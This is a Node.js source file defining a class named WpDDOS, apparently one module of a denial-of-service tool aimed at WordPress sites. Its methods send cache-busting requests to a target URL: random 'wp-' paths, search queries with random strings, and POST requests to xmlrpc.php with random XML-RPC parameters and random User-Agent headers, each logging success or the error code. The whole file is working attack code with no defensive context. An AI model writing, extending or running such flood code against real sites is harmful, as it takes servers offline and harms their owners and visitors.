/**
 * Created by g00dv1n on 27.09.16.
 */
'use strict'

let rp = require('request-promise');
let config = require('./config');


class WpDDOS {
    constructor(url, method) {
        this.url = url;
        this.method = method;
    }

    getHomePage(url) {
        return rp(url)
            .then(()=>{
                this.printOk(url);
            })
            .catch((err)=>{
                this.printError(url,err);
            });
    }

    printError(url, err) {
        console.log('------------------------------');
        console.log(new Date() +' | ' + url);
        console.log(err && err.statusCode || 500);
        console.log('------------------------------');
    }

    printOk(url) {
        console.log('------------------------------');
        console.log(new Date() +' | ' + url);
        console.log('OK!');
        console.log('------------------------------');
    }

    getRandomWp(url) {
        let randStr = Math.random().toString(36).substring(7);
        let fullUrl = `${url}wp-${randStr}`;

        return rp(fullUrl)
            .then(()=>{
                this.printOk(url);
            })
            .catch((err)=>{
                this.printError(fullUrl,err);
            });
    }

    postRandomXmlRpc(url) {
        let randStr = Math.random().toString(36).substring(7);
        let fullUrl = url + 'xmlrpc.php';
        let options = {
            url: fullUrl,
            method: 'POST',
            headers: {
                'content-type': 'application/xml',
                'User-Agent': randStr
            },
            body: `
            <?xml version="1.0" encoding="utf-8"?>
                <methodCall>
                <methodName>wp.getPosts</methodName>
                    <params>
                        <param>
                            <value>${randStr}</value>
                        </param>
            </params>
            </methodCall>
            `
        };

        return rp(options)
            .then(()=>{
                this.printOk(fullUrl
                );
            })
            .catch((err)=>{
                this.printError(fullUrl,err);
            });
    }
    getWpSearch(url) {
        let randStr = Math.random().toString(36).substring(7);
        let fullUrl = `${url}?s=${randStr}`;

        return rp(fullUrl)
            .then(()=>{
                this.printOk(url);
            })
            .catch((err)=>{
                this.printError(fullUrl,err);
            });
    }

    runAll() {
        let task = this[this.method];
        task.call(this, this.url);
    }

}

module.exports = WpDDOS;

